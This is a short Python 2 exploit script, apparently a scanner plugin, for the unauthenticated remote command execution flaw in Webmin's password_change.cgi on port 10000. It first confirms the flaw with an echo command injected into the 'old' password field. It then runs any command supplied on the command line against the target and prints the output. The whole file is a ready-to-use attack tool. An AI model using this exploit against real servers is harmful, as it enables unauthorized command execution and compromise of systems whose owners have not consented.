#!/usr/bin/env python
# coding:utf-8
import requests
import urlparse
import sys
import re


def assign(service, arg):  
	if service.lower() in ['www', 'ip']:
		return True, arg
	else:
		return False, False

def parse_url(url):
	if url.startswith("http"):
		res = urlparse.urlparse(url)
	else:
		res = urlparse.urlparse('http://%s' % url)	 
	return res.scheme, res.hostname, res.port

def audit(arg, package=None): 
	scheme, url, port = parse_url(arg)	
	if port is None and scheme == 'https':
		port = 443
	elif port is None and scheme == 'http':
		port = 80
	else:
		port = port
	payload_url = 'https' + '://' + url + ':10000'
	payload_poc = payload_url + "/password_change.cgi"
	payload_cmd = "echo xxx@xxx"
	payload_cmd_1 = sys.argv[2]
	headers = {
		"Host":"{}:{}".format(url,port),
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0",
		"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Referer":"{}".format(payload_url+'/sesss.cgi'),
		"Cookie":"redirect=1; testing=1",
		"Upgrade-Insecure-Requests":"1"
	}
	payload="user=xxx&pam=&expired=2&old={}&new1=xxx&new2=xxx".format(payload_cmd)
  
	try:
		respone = requests.post(payload_poc, headers=headers, data=payload,timeout=3,verify=False)
		if respone.status_code ==200 and "xxx@xxx" in respone.content : 
			try:
				payload="user=xxx&pam=&expired=2&old={}&new1=xxx&new2=xxx".format(payload_cmd_1)
				respone = requests.post(payload_poc, headers=headers, data=payload,timeout=3,verify=False)
				print respone.content
			except Exception:
				pass
		elif 'Error' in respone.content and respone.status_code == 500:
			print('[-]{} 不存在Webmin未授权远程命令执行漏洞'.format(url))
	
	except Exception:
		pass

if __name__ == '__main__':
	audit(assign('WWW', sys.argv[1])[1])